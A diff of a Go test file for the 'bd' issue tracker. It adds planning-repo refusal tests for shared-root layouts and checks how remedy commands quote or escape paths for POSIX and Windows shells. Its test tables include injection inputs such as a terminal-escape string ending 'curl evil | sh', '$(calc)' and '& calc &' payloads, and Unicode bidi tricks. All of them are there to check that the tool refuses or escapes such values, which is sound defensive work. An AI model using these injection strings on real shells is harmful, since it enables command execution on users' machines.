@@ -12,6 +12,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"slices"
+	"strconv"
 	"strings"
 	"testing"
 	"time"
@@ -626,21 +627,16 @@ func TestEmbeddedMigratePersonal_refusesPlanningRepoThatIsTheProject(t *testing.
 	}
 }
 
-// TestEmbeddedMigratePersonal_refusesSharedRootRigAsARedirect verifies that a
-// planning repo that is a rig beside the project under a shared root, where
-// both redirect to one .beads and each names a database of its own, is refused
-// as the redirect stub it is, naming the database bd uses there, and not as
-// the project's own workspace: the two rigs are different databases.
-func TestEmbeddedMigratePersonal_refusesSharedRootRigAsARedirect(t *testing.T) {
-	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
-		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
-	}
-	t.Parallel()
-
-	bd := buildEmbeddedBD(t)
-	_, townBeadsDir, _ := bdInit(t, bd, "--prefix", "hq")
+// sharedRootLayout lays out a shared root as Gas City does: a repository root
+// whose .beads holds its own database, hq, and the database rga beside it,
+// whose issue_prefix is rga. rig returns a new repository whose .beads
+// redirects to rootBeadsDir and whose metadata.json names database there (""
+// names none), as each rig of a shared root does.
+func sharedRootLayout(t *testing.T, bd string) (root, rootBeadsDir string, rig func(database string) string) {
+	t.Helper()
+	root, rootBeadsDir, _ = bdInit(t, bd, "--prefix", "hq")
 	// The project rig's database, beside the shared root's own.
-	s, err := embeddeddolt.Open(t.Context(), townBeadsDir, "rga", "main")
+	s, err := embeddeddolt.Open(t.Context(), rootBeadsDir, "rga", "main")
 	if err != nil {
 		t.Fatalf("create the project rig's database: %v", err)
 	}
@@ -651,9 +647,7 @@ func TestEmbeddedMigratePersonal_refusesSharedRootRigAsARedirect(t *testing.T) {
 	if err != nil {
 		t.Fatalf("set the project rig's issue_prefix: %v", err)
 	}
-	// rig returns a repository whose .beads redirects to the shared root and
-	// names database there.
-	rig := func(database string) string {
+	rig = func(database string) string {
 		dir := t.TempDir()
 		initGitRepoAt(t, dir)
 		beadsDir := filepath.Join(dir, ".beads")
@@ -667,11 +661,27 @@ func TestEmbeddedMigratePersonal_refusesSharedRootRigAsARedirect(t *testing.T) {
 		if err := cfg.Save(beadsDir); err != nil {
 			t.Fatalf("write rig metadata.json: %v", err)
 		}
-		if err := os.WriteFile(filepath.Join(beadsDir, "redirect"), []byte(townBeadsDir+"\n"), 0o600); err != nil {
+		if err := os.WriteFile(filepath.Join(beadsDir, "redirect"), []byte(rootBeadsDir+"\n"), 0o600); err != nil {
 			t.Fatalf("write rig redirect: %v", err)
 		}
 		return dir
 	}
+	return root, rootBeadsDir, rig
+}
+
+// TestEmbeddedMigratePersonal_refusesSharedRootRigAsARedirect verifies that a
+// planning repo that is a rig beside the project under a shared root, where
+// both redirect to one .beads and each names a database of its own, is refused
+// as the redirect stub it is, naming the database bd uses there, and not as
+// the project's own workspace: the two rigs are different databases.
+func TestEmbeddedMigratePersonal_refusesSharedRootRigAsARedirect(t *testing.T) {
+	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
+		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
+	}
+	t.Parallel()
+
+	bd := buildEmbeddedBD(t)
+	_, townBeadsDir, rig := sharedRootLayout(t, bd)
 	project, planning := rig("rga"), rig("rgb")
 	if out, err := bdRunWithFlockRetry(t, bd, project, "config", "set", "routing.contributor", planning); err != nil {
 		t.Fatalf("bd config set routing.contributor: %v\n%s", err, out)
@@ -690,13 +700,71 @@ func TestEmbeddedMigratePersonal_refusesSharedRootRigAsARedirect(t *testing.T) {
 	requireStillInProject(t, townBeadsDir, "rga", personal.ID)
 }
 
+// TestEmbeddedMigratePersonal_refusesSharedRootFromARig verifies, from a rig
+// under a shared root (the Gas City layout), how a planning repo that uses the
+// shared root's own database is refused: the shared root itself, and a stub
+// that redirects to it naming that database. Each is refused before the
+// confirmation prompt, naming the database bd uses there and the project's,
+// and points routing.contributor at a separate planning repository, never at
+// the shared root, which would only be refused in turn. That remedy, followed,
+// moves the issue.
+func TestEmbeddedMigratePersonal_refusesSharedRootFromARig(t *testing.T) {
+	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
+		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
+	}
+	t.Parallel()
+
+	bd := buildEmbeddedBD(t)
+	town, townBeadsDir, rig := sharedRootLayout(t, bd)
+	project := rig("rga")
+	const title = "Personal issue in a shared-root rig"
+	personal := bdCreate(t, bd, project, title)
+
+	const want = ` holds the .beads this project uses, where bd uses the database "hq", not this project's "rga"; a database beside this project's is not a separate planning repository; set routing.contributor to a separate planning repository (e.g. ~/.beads-planning)`
+	for _, tc := range []struct {
+		name, planning, notWant string
+	}{
+		// Before, this was refused as a redirect with the remedy "set
+		// routing.contributor to that repository instead": the shared root.
+		{"a stub naming the shared root's database", rig("hq"), "that repository instead"},
+		{"the shared root itself", town, "this project's own workspace"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			if out, err := bdRunWithFlockRetry(t, bd, project, "config", "set", "routing.contributor", tc.planning); err != nil {
+				t.Fatalf("bd config set routing.contributor: %v\n%s", err, out)
+			}
+			out := requireMigratePersonalRefused(t, bd, project, want)
+			if strings.Contains(out, tc.notWant) {
+				t.Errorf("bd migrate-personal --yes output contains %q:\n%s", tc.notWant, out)
+			}
+			requireCleanPlanningRefusal(t, out, tc.planning)
+			// Refused before the confirmation prompt, which follows this line.
+			if strings.Contains(out, "Move to planning repo") {
+				t.Errorf("refused after the confirmation prompt:\n%s", out)
+			}
+		})
+	}
+
+	// The remedy the refusals give works from a rig. Stores are opened in
+	// process only after the last bd subprocess.
+	planningDir := setupContributorRouting(t, bd, project)
+	if out := requireMigratePersonal(t, bd, project); !strings.Contains(out, "Moved 1 issue") {
+		t.Errorf("bd migrate-personal --yes output does not report the move:\n%s", out)
+	}
+	requireMovedToPlanning(t, townBeadsDir, "rga", planningDir, personal.ID, title)
+}
+
 // TestRefuseSelfPlanningRepo pins which planning repos refuseSelfPlanningRepo
-// refuses. One whose .beads, after any redirect, is the project's is the
-// project's own workspace, unless it is a redirect stub naming a database
-// other than the one the project's store uses there: a rig beside the
-// project under a shared root, which it refuses as a redirect instead. A
-// separate directory carrying the project's
-// project_id is a clone of the project, and is refused as one.
+// refuses, and how. Every one whose .beads, after any redirect, is the
+// project's is refused, named for the database bd uses there: the project's
+// own is the project's own workspace; one a stub names, other than the
+// .beads's own, is a rig beside the project under a shared root, refused as a
+// redirect; the .beads's own, from a rig under that shared root, is named as
+// that database. A separate directory carrying the project's project_id is a
+// clone of the project, and is refused as one. Every refusal ends pointing
+// routing.contributor at a separate planning repository: none of these is
+// one, so no refusal may point it at the shared root, which would only be
+// refused in turn.
 func TestRefuseSelfPlanningRepo(t *testing.T) {
 	root := t.TempDir()
 	// workspace writes a .beads under root/name whose metadata.json names
@@ -726,6 +794,9 @@ func TestRefuseSelfPlanningRepo(t *testing.T) {
 	// project with stubs redirecting to it.
 	town := workspace("town", "hq", "town-id", "")
 	project := workspace("project", "proj", "project-id", "")
+	// A legacy workspace whose metadata.json names no dolt_database: bd uses
+	// the default database there.
+	legacy := workspace("legacy", "", "legacy-id", "")
 	for _, tc := range []struct {
 		name string
 		// projectBeadsDir is the project's .beads as the command resolved
@@ -749,11 +820,28 @@ func TestRefuseSelfPlanningRepo(t *testing.T) {
 		{name: "a rig beside the project under a shared root", projectBeadsDir: town, launchDatabase: "rga",
 			planningBeadsDir: workspace("rigB", "rgb", "", town),
 			want:             `where bd uses the database "rgb" that the planning repo names; routing.contributor cannot select that database`},
-		// "." run at the shared root while BEADS_DOLT_SERVER_DATABASE selects
-		// a rig's database: a planning repo that is no stub is where the
-		// project's store is, so it stays refused.
+		// From a rig under a shared root, a planning repo using the shared
+		// root's own database: the root itself, or a stub naming that
+		// database or none. Not the project's database, and not a separate
+		// planning repository either, so it stays refused, named as what it
+		// is.
 		{name: "the shared root itself", projectBeadsDir: town, launchDatabase: "rga",
-			planningBeadsDir: town, want: "is this project's own workspace"},
+			planningBeadsDir: town,
+			want:             "planning repo " + filepath.Dir(town) + ` holds the .beads this project uses, where bd uses the database "hq", not this project's "rga"; a database beside this project's is not a separate planning repository`},
+		{name: "a stub naming the shared root's database", projectBeadsDir: town, launchDatabase: "rga",
+			planningBeadsDir: workspace("rigHQ", "hq", "", town),
+			want:             `, which holds the .beads this project uses, where bd uses the database "hq", not this project's "rga"; a database beside this project's is not a separate planning repository`},
+		{name: "a stub naming no database under a shared root", projectBeadsDir: town, launchDatabase: "rga",
+			planningBeadsDir: workspace("rigNone", "", "", town),
+			want:             `, which holds the .beads this project uses, where bd uses the database "hq", not this project's "rga"; a database beside this project's is not a separate planning repository`},
+		{name: "a legacy project itself", projectBeadsDir: legacy, planningBeadsDir: legacy,
+			want: "is this project's own workspace"},
+		{name: "a legacy shared root itself", projectBeadsDir: legacy, launchDatabase: "rga",
+			planningBeadsDir: legacy,
+			want:             "planning repo " + filepath.Dir(legacy) + ` holds the .beads this project uses, where bd uses the database "beads", not this project's "rga"`},
+		{name: "a stub naming no database under a legacy shared root", projectBeadsDir: legacy, launchDatabase: "rga",
+			planningBeadsDir: workspace("legacyRigNone", "", "", legacy),
+			want:             `, which holds the .beads this project uses, where bd uses the database "beads", not this project's "rga"`},
 		{name: "a clone carrying the project's project_id", projectBeadsDir: project,
 			planningBeadsDir: workspace("clone", "proj", "project-id", ""),
 			want:             "has this project's project_id (project-id), so it is a clone of this project's workspace"},
@@ -768,6 +856,10 @@ func TestRefuseSelfPlanningRepo(t *testing.T) {
 				t.Errorf("refuseSelfPlanningRepo = %v, want nil", err)
 			case tc.want != "" && (err == nil || !strings.Contains(err.Error(), tc.want)):
 				t.Errorf("refuseSelfPlanningRepo = %v, want an error containing %q", err, tc.want)
+			}
+			const remedy = "; set routing.contributor to a separate planning repository (e.g. ~/.beads-planning)"
+			if err != nil && !strings.HasSuffix(err.Error(), remedy) {
+				t.Errorf("refuseSelfPlanningRepo = %v, want its remedy to end %q", err, remedy)
 			}
 		})
 	}
@@ -1358,9 +1450,12 @@ func TestEmbeddedMigratePersonal_repoSyncMirrorHint(t *testing.T) {
 	}
 	requireStillInProject(t, beadsDir, "mps", planningIssue.ID)
 
-	// The path is quoted for this host's shell (TestShellQuotedPathFor), and
+	// The path is quoted for this host's shell (TestShellQuotedFor), and
 	// the hint says how to turn back on the hydration bd repo remove turns off.
-	quoted := shellQuotedPathFor(runtime.GOOS, planningDir)
+	quoted, ok := shellQuotedFor(runtime.GOOS, planningDir)
+	if !ok {
+		t.Fatalf("shellQuotedFor(%q, %q) cannot quote the planning repo's path", runtime.GOOS, planningDir)
+	}
 	requireMigratePersonalRefused(t, bd, dir, "by `bd repo sync` (remove those copies with `bd repo remove "+quoted+
 		"`, then rerun, and run `bd repo add "+quoted+"` again if you want them hydrated); nothing was moved")
 	requireStillInProject(t, beadsDir, "mps", personal.ID)
@@ -1754,36 +1849,192 @@ func TestIsPlanningRepoMirror(t *testing.T) {
 	}
 }
 
-// TestShellQuotedPathFor pins how the phase-0 mirror refusal quotes a
-// source_repo for the shell its commands are pasted into: in single quotes on
-// POSIX, which keep $, backticks and quotes literal, and in plain double
-// quotes on Windows, whose shells keep backslashes as they are (Go's %q
-// doubled them there, and bd repo remove then found no such repository). On
-// a POSIX host each POSIX form is also run through sh, which must pass the
-// path on unchanged.
-func TestShellQuotedPathFor(t *testing.T) {
+// TestShellQuotedFor pins how a remedy quotes a value (a source_repo, a
+// dolt.host) for the shell its command is pasted into, and which values it
+// refuses to print in a command at all (shellQuotedFor). On POSIX a value goes
+// in single quotes unless it holds a backslash, which fish reads as an escape
+// there, or a single quote: PowerShell ends them at a ' even as
+// doltutil.ShellQuote escapes it, and at ‘ ’ ‚ ‛. On Windows a value goes in
+// plain double quotes, which keep its backslashes as they are (Go's %q
+// doubled them, and bd repo remove then found no such repository), unless a
+// Windows shell would not pass it on unchanged: a " ends cmd.exe's quotes, so
+// the rest of a crafted host runs as a command; PowerShell expands $( ) and
+// $name, unescapes a backtick and ends the quotes at a curly quote; cmd.exe
+// expands %name% and !name! and ends the command at a line break, and acts on
+// & | < > ^ in an argument PowerShell hands a .cmd shim unquoted, and reads
+// ; , = there as separating a batch file's arguments, so a shim that reads
+// them one by one would hand bd init db.example.com;--recreate-missing as two;
+// bash collapses \\ to one; and Go reads a trailing backslash as escaping the
+// closing quote. Each POSIX and Windows character is refused by a row of its
+// own. On both, a value that does not print as itself is refused: a control
+// character ends the command, or redraws the printed one in the terminal so a
+// different command is copied, U+202E reverses the text after it, U+2028
+// splits the line, and a stray byte that is not UTF-8 can start a control
+// sequence. A space such as U+00A0, U+202F or the U+3000 a Japanese IME types
+// prints as itself, and is quoted like any other character. On a POSIX host
+// each printed form is also run through a shell, which must pass the value on
+// unchanged: sh for the POSIX forms, and bash, as Git Bash on Windows runs
+// them, for the Windows forms.
+func TestShellQuotedFor(t *testing.T) {
 	t.Parallel()
 	for _, tc := range []struct {
-		goos, path, want string
+		goos, value, want string // want "" = refused
 	}{
 		{"linux", "/home/me/.beads-planning", `'/home/me/.beads-planning'`},
-		{"darwin", "/tmp/$HOME/it's `id`", `'/tmp/$HOME/it'\''s ` + "`id`'"},
+		{"darwin", "/tmp/$HOME/`id`", "'/tmp/$HOME/`id`'"},
+		{"linux", "/home/zoë/計画 (2)", "'/home/zoë/計画 (2)'"},
+		{"linux", "/home/太郎/プロジェクト\u3000計画", "'/home/太郎/プロジェクト\u3000計画'"},
+		{"linux", "/home/me/my\u00a0planning", "'/home/me/my\u00a0planning'"},
+		{"darwin", "/Users/me/Planning 9.41\u202fAM", "'/Users/me/Planning 9.41\u202fAM'"},
+		{"linux", "db.example.com;--recreate-missing", "'db.example.com;--recreate-missing'"},
+		{"linux", `x" & calc & "$(calc)`, `'x" & calc & "$(calc)'`},
+		{"linux", "db\ncalc", ""},
+		{"linux", "\x1b[2K\rbd init --server-host db; curl evil | sh #", ""},
+		{"darwin", "db\u009bx", ""},
+		{"linux", "db\x9b2Jx", ""},
+		{"linux", "db\u202ex", ""},
+		{"linux", "db\u2028x", ""},
+		{"linux", `x\'; calc #`, ""},
+		{"linux", `x\`, ""},
+		{"linux", "x'; calc #", ""},
+		{"darwin", "x\u2018; calc #", ""},
+		{"darwin", "x\u2019; calc #", ""},
+		{"darwin", "x\u201a; calc #", ""},
+		{"darwin", "x\u201b; calc #", ""},
 		{"windows", `C:\Users\me\.beads-planning`, `"C:\Users\me\.beads-planning"`},
-		{"windows", `C:\Users\Jane Doe\R&D planning`, `"C:\Users\Jane Doe\R&D planning"`},
+		{"windows", `C:\Users\Jane Doe\Proj (x86) it's #1 @home ~a +b [e] {f}`, `"C:\Users\Jane Doe\Proj (x86) it's #1 @home ~a +b [e] {f}"`},
+		{"windows", `C:\Users\太郎\プロジェクト` + "\u3000" + `計画`, `"C:\Users\太郎\プロジェクト` + "\u3000" + `計画"`},
+		{"windows", `C:\Users\me\my` + "\u00a0" + `planning`, `"C:\Users\me\my` + "\u00a0" + `planning"`},
+		{"windows", "db.example.com; calc", ""},
+		{"windows", "db.example.com;--recreate-missing", ""},
+		{"windows", "db.example.com,--recreate-missing", ""},
+		{"windows", "db.example.com=--recreate-missing", ""},
+		{"windows", `x" & calc & "`, ""},
+		{"windows", `x";calc;#`, ""},
+		{"windows", "db\u201ex", ""},
+		{"windows", "db\u201cx", ""},
+		{"windows", "db\u201dx", ""},
+		{"windows", "db|calc", ""},
+		{"windows", "db<x", ""},
+		{"windows", "db>x", ""},
+		{"windows", "db^x", ""},
+		{"windows", "\x1b[2K\rbd init", ""},
+		{"windows", "db\u202ex", ""},
+		{"windows", "db\u2028x", ""},
+		{"windows", "$(calc)", ""},
+		{"windows", `C:\Users\me\$work\planning`, ""},
+		{"windows", "C:\\Users\\me\\`tplanning", ""},
+		{"windows", "db\u201d; calc; \u201c", ""},
+		{"windows", `C:\100%PATH%\planning`, ""},
+		{"windows", `C:\Hello!\planning`, ""},
+		{"windows", "db&calc", ""},
+		{"windows", `C:\Users\Jane Doe\R&D planning`, ""},
+		{"windows", "db\r\ncalc", ""},
+		{"windows", `\\server\share\planning`, ""},
+		{"windows", `C:\planning\`, ""},
 	} {
-		got := shellQuotedPathFor(tc.goos, tc.path)
-		if got != tc.want {
-			t.Errorf("shellQuotedPathFor(%q, %q) = %s, want %s", tc.goos, tc.path, got, tc.want)
+		got, ok := shellQuotedFor(tc.goos, tc.value)
+		if got != tc.want || ok != (tc.want != "") {
+			t.Errorf("shellQuotedFor(%q, %q) = %s, %v, want %s, %v", tc.goos, tc.value, got, ok, tc.want, tc.want != "")
 		}
-		if tc.goos == "windows" || runtime.GOOS == "windows" {
+		if !ok || runtime.GOOS == "windows" {
+			continue
+		}
+		shell := "sh"
+		if tc.goos == "windows" {
+			shell = "bash"
+		}
+		out, err := exec.Command(shell, "-c", "printf '%s' "+got).Output()
+		if err != nil {
+			t.Fatalf("%s -c \"printf '%%s' %s\": %v", shell, got, err)
+		}
+		if string(out) != tc.value {
+			t.Errorf("%s passed %s on as %q, want %q", shell, got, out, tc.value)
+		}
+	}
+}
+
+// TestEscapedValue pins how a refusal names a value its remedy leaves as a
+// placeholder (escapedValue): Go-quoted, so strconv.Unquote reads the name back
+// as the value, with every quote and every $ ` % ! & | < > ^ ; , = escaped too,
+// so no shell expands what is between its double quotes, ends them early or
+// splits the argument there, and a user who pastes the name as printed runs
+// nothing. strconv.Quote alone left x" & calc & "$(calc) as
+// "x\" & calc & \"$(calc)", which bash runs $(calc) in, and PowerShell, which
+// takes \ literally, ends at the second " and runs calc. On a POSIX host each
+// name is also run through sh, which must print what is between its quotes,
+// reading only each \\ there as one backslash.
+func TestEscapedValue(t *testing.T) {
+	t.Parallel()
+	for _, tc := range []struct{ value, want string }{
+		{"db.example.com", `"db.example.com"`},
+		{`x" & calc & "$(calc)`, `"x\x22 \x26 calc \x26 \x22\x24(calc)"`},
+		{"x'; calc #", `"x\x27\x3b calc #"`},
+		{`C:\Users\me\$work\planning\`, `"C:\\Users\\me\\\x24work\\planning\\"`},
+		{"db.example.com;--recreate-missing,=", `"db.example.com\x3b--recreate-missing\x2c\x3d"`},
+		{"`calc` %PATH% !x! a|b<c>d^e", `"\x60calc\x60 \x25PATH\x25 \x21x\x21 a\x7cb\x3cc\x3ed\x5ee"`},
+		{"\u201ccalc\u201d \u201e \u2018x\u2019 \u201a \u201b", `"\u201ccalc\u201d \u201e \u2018x\u2019 \u201a \u201b"`},
+		{"\x1b[2K\rbd\u202e\u3000計画\xff", `"\x1b[2K\rbd\u202e\u3000計画\xff"`},
+	} {
+		got := escapedValue(tc.value)
+		if got != tc.want {
+			t.Errorf("escapedValue(%q) = %s, want %s", tc.value, got, tc.want)
+		}
+		if unquoted, err := strconv.Unquote(got); err != nil || unquoted != tc.value {
+			t.Errorf("strconv.Unquote(%s) = %q, %v, want %q", got, unquoted, err, tc.value)
+		}
+		inner := strings.TrimSuffix(strings.TrimPrefix(got, `"`), `"`)
+		if strings.ContainsAny(inner, "\"“”„'‘’‚‛$`%!&|<>^;,=") {
+			t.Errorf("escapedValue(%q) = %s holds a character a shell acts on between its quotes", tc.value, got)
+		}
+		if runtime.GOOS == "windows" {
 			continue
 		}
 		out, err := exec.Command("sh", "-c", "printf '%s' "+got).Output()
 		if err != nil {
 			t.Fatalf("sh -c \"printf '%%s' %s\": %v", got, err)
 		}
-		if string(out) != tc.path {
-			t.Errorf("sh passed %s on as %q, want %q", got, out, tc.path)
+		if want := strings.ReplaceAll(inner, `\\`, `\`); string(out) != want {
+			t.Errorf("sh printed %s as %q, want %q", got, out, want)
 		}
+	}
+}
+
+// TestRepoSyncMirrorRefusal pins the phase-0 refusal's bd repo remove and bd
+// repo add commands on both platforms: the source_repo quoted for the shell
+// (TestShellQuotedFor), or, when no quoting passes it on unchanged there, a
+// <path> placeholder for the path the refusal names escaped (TestEscapedValue),
+// so pasting that name in its place runs nothing either. A value it names that
+// does not print as itself, such as one holding a carriage return, a terminal
+// escape or U+202E, is named escaped (printedValue), so none of those reaches
+// the line the commands are printed on.
+func TestRepoSyncMirrorRefusal(t *testing.T) {
+	t.Parallel()
+	const prefix = "issue mps-1 already exists in the planning repo P; the project copy was imported from "
+	const placeholders = "`bd repo sync` (remove those copies with `bd repo remove <path>`, then rerun, and run `bd repo add <path>` again if you want them hydrated, with that path for <path>); nothing was moved"
+	for _, tc := range []struct {
+		goos, sourceRepo, want string
+	}{
+		{"linux", "/home/me/planning", prefix + "/home/me/planning by `bd repo sync` (remove those copies with `bd repo remove '/home/me/planning'`, then rerun, and run `bd repo add '/home/me/planning'` again if you want them hydrated); nothing was moved"},
+		{"windows", `C:\planning`, prefix + `C:\planning by ` + "`bd repo sync` (remove those copies with `bd repo remove \"C:\\planning\"`, then rerun, and run `bd repo add \"C:\\planning\"` again if you want them hydrated); nothing was moved"},
+		{"windows", `C:\planning\`, prefix + `"C:\\planning\\" by ` + placeholders},
+		{"windows", `C:\Users\me\$work\planning`, prefix + `"C:\\Users\\me\\\x24work\\planning" by ` + placeholders},
+		{"windows", `C:\x" & calc & "$(calc)`, prefix + `"C:\\x\x22 \x26 calc \x26 \x22\x24(calc)" by ` + placeholders},
+		{"linux", "/home/me/x'; calc #", prefix + `"/home/me/x\x27\x3b calc #" by ` + placeholders},
+		{"linux", "/home/me/planning/\x1b[2K\r/..", prefix + `"/home/me/planning/\x1b[2K\r/.." by ` + placeholders},
+		{"windows", "C:\\planning\u202e\\..", prefix + `"C:\\planning\u202e\\.." by ` + placeholders},
+	} {
+		err := repoSyncMirrorRefusal(&types.Issue{ID: "mps-1", SourceRepo: tc.sourceRepo}, "P", tc.goos)
+		if err == nil || err.Error() != tc.want || strings.ContainsAny(err.Error(), "\x1b\r\u202e") {
+			t.Errorf("repoSyncMirrorRefusal(source_repo %q, %q) = %q\nwant %q", tc.sourceRepo, tc.goos, err, tc.want)
+		}
+	}
+	// The issue ID and planning repo it names beside the commands are spelled
+	// the same way.
+	id, planningPath := "mps-1\x1b[2K", "/home/me/planning\r"
+	err := repoSyncMirrorRefusal(&types.Issue{ID: id, SourceRepo: planningPath}, planningPath, "linux")
+	want := `issue "mps-1\x1b[2K" already exists in the planning repo "/home/me/planning\r"; the project copy was imported from "/home/me/planning\r" by ` + placeholders
+	if err == nil || err.Error() != want || strings.ContainsAny(err.Error(), "\x1b\r") {
+		t.Errorf("repoSyncMirrorRefusal(ID %q, planning repo %q) = %q\nwant %q", id, planningPath, err, want)
 	}
 }
